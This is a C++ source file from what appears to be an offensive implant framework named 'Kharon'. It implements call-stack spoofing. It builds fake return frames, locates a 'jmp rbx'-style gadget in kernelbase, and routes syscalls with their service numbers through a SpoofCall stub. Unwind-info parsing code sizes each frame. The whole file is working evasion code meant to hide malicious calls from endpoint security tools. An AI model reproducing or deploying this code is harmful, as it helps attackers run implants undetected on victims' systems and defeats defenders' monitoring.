#include <Kharon.h>

#define ALIGN_UP(x, align) (((x) + ((align) - 1)) & ~((align) - 1))
#define ALIGN_DOWN(x, align) ((x) & ~((align) - 1))

EXTERN_C UPTR SpoofCall( ... );

auto DECLFN Spoof::Call(
    _In_ UPTR Fnc, 
    _In_ UPTR Ssn, 
    _In_ UPTR Arg1,
    _In_ UPTR Arg2,
    _In_ UPTR Arg3,
    _In_ UPTR Arg4,
    _In_ UPTR Arg5,
    _In_ UPTR Arg6,
    _In_ UPTR Arg7,
    _In_ UPTR Arg8,
    _In_ UPTR Arg9,
    _In_ UPTR Arg10,
    _In_ UPTR Arg11,
    _In_ UPTR Arg12
) -> UPTR {
    Self->Spf->Setup.FramesCount = Self->Config.Spoof.FrameCount;

    for ( int i = 0; i < Self->Spf->Setup.FramesCount; i++ ) {
        Self->Config.Spoof.Frames[i].Size = (UPTR)Self->Spf->StackSizeWrapper( Self->Config.Spoof.Frames[i].Ptr );
        Self->Spf->Setup.Frames[i] = Self->Config.Spoof.Frames[i];

        KhDbg("[%d] %p", i, Self->Spf->Setup.Frames[i].Ptr);
    }

    do {
        this->Setup.Gadget.Ptr  = Self->Usf->FindGadget( Self->KrnlBase.Handle, 0x23 );
        this->Setup.Gadget.Size = (UPTR)this->StackSizeWrapper( this->Setup.Gadget.Ptr );
    } while ( ! this->Setup.Gadget.Size );

    this->Setup.Ssn      = Ssn;
    this->Setup.ArgCount = 0;

    if ( Arg1  ) this->Setup.ArgCount++;
    if ( Arg2  ) this->Setup.ArgCount++;
    if ( Arg3  ) this->Setup.ArgCount++;
    if ( Arg4  ) this->Setup.ArgCount++;
    if ( Arg5  ) this->Setup.ArgCount++;
    if ( Arg6  ) this->Setup.ArgCount++;
    if ( Arg7  ) this->Setup.ArgCount++;
    if ( Arg8  ) this->Setup.ArgCount++;
    if ( Arg9  ) this->Setup.ArgCount++;
    if ( Arg10 ) this->Setup.ArgCount++;
    if ( Arg11 ) this->Setup.ArgCount++;
    if ( Arg12 ) this->Setup.ArgCount++;

    KhDbg("arg count: %d\n", this->Setup.ArgCount);
    KhDbg("Gadget: Ptr=%p Size=%d", this->Setup.Gadget.Ptr, this->Setup.Gadget.Size);

    return SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, (UPTR)&this->Setup, Arg5, Arg6, Arg7, Arg8, Arg9, Arg10, Arg11, Arg12 );
}

auto DECLFN Spoof::StackSizeInternal(
    _In_ UPTR RtmFunction,
    _In_ UPTR ImgBase,
    _In_ UPTR RetAddress
) -> UPTR {
    RUNTIME_FUNCTION* pFunc = reinterpret_cast<RUNTIME_FUNCTION*>( RtmFunction );
    
    if ( !pFunc || !ImgBase ) {
        return 0;
    }

    ULONG FuncOffset = (ULONG)(RetAddress - ImgBase - pFunc->BeginAddress);

    UNWIND_INFO* UwInfo = reinterpret_cast<UNWIND_INFO*>(pFunc->UnwindData + ImgBase);
    
    if ( UwInfo->Version < 1 || UwInfo->Version > 2 ) {
        return 0;
    }

    ULONG TotalSize = 0;
    ULONG CodeCount = UwInfo->CountOfCodes;
    UNWIND_CODE* UwCode = UwInfo->UnwindCode;
    BOOL HasFpReg = FALSE;

    for ( ULONG i = 0; i < CodeCount; ) {
        UBYTE UnwOp  = UwCode[i].UnwindOp;
        UBYTE OpInfo = UwCode[i].OpInfo;

        BOOL Skip = (UwCode[i].CodeOffset > FuncOffset);

        switch ( UnwOp ) {
            case UWOP_PUSH_NONVOL:          // 0
                if ( !Skip ) TotalSize += 8;
                i++;
                break;

            case UWOP_ALLOC_LARGE:          // 1
                if ( OpInfo == 0 ) {
                    if ( !Skip && !HasFpReg )
                        TotalSize += (ULONG)UwCode[i + 1].FrameOffset * 8;
                    i += 2;
                } else {
                    if ( !Skip && !HasFpReg )
                        TotalSize += *(ULONG*)&UwCode[i + 1];
                    i += 3;
                }
                break;

            case UWOP_ALLOC_SMALL:          // 2
                if ( !Skip && !HasFpReg )
                    TotalSize += (OpInfo * 8) + 8;
                i++;
                break;

            case UWOP_SET_FPREG:            // 3
                if ( !Skip ) {
                    HasFpReg = TRUE;
                    TotalSize += UwInfo->FrameOffset * 16;
                }
                i++;
                break;

            case UWOP_SAVE_NONVOL:          // 4
                i += 2;
                break;

            case UWOP_SAVE_NONVOL_BIG:      // 5
                i += 3;
                break;

            case UWOP_EPILOG:               // 6
                i += 2;
                break;

            case UWOP_SPARE_CODE:           // 7
                i += 3;
                break;

            case UWOP_SAVE_XMM128:          // 8
                i += 2;
                break;

            case UWOP_SAVE_XMM128BIG:       // 9
                i += 3;
                break;

            case UWOP_PUSH_MACH_FRAME:      // 10
                if ( !Skip ) TotalSize += (OpInfo ? 48 : 40);
                i++;
                break;

            default:
                i++;
                break;
        }
    }

    if ( UwInfo->Flags & UNW_FLAG_CHAININFO ) {
        ULONG ChainOffset = CodeCount;
        if ( ChainOffset & 1 ) ChainOffset++;

        RUNTIME_FUNCTION* ChainFunc = reinterpret_cast<RUNTIME_FUNCTION*>(
            &UwInfo->UnwindCode[ChainOffset]
        );
        
        TotalSize += this->StackSizeInternal( (UPTR)ChainFunc, ImgBase, RetAddress );
    }

    return TotalSize;
}

auto DECLFN Spoof::StackSize(
    _In_ UPTR RtmFunction,
    _In_ UPTR ImgBase,
    _In_ UPTR RetAddress
) -> UPTR {
    ULONG TotalSize = this->StackSizeInternal( RtmFunction, ImgBase, RetAddress );

    TotalSize += 8;
    TotalSize = ALIGN_UP( TotalSize, 16 );

    return TotalSize;
}

auto DECLFN Spoof::StackSizeWrapper(
    _In_ UPTR RetAddress
) -> UPTR {
    if ( !RetAddress ) {
        return 0;
    }

    UPTR                 ImgBase    = 0;
    UNWIND_HISTORY_TABLE HistoryTbl = { 0 };
    
    RUNTIME_FUNCTION* RtmFunction = Self->Ntdll.RtlLookupFunctionEntry(
        RetAddress, &ImgBase, &HistoryTbl
    );
    if ( !RtmFunction ) {
        return 0x20;
    }

    return this->StackSize( (UPTR)RtmFunction, ImgBase, RetAddress );
}